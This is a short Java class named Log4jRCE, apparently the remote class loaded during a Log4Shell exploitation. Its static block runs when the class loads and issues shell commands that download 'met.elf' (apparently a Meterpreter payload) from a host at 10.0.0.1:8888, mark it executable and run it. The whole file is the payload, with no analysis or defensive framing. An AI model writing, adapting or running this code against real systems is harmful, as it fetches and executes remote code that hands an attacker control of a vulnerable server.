public class Log4jRCE {

    static {

        try {

            Runtime r1 = Runtime.getRuntime();

            Process p1 = r1.exec("wget http://10.0.0.1:8888/met.elf");
            Process p2 = r1.exec("chmod +x met.elf");
            Process p3 = r1.exec("./met.elf");
            p3.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
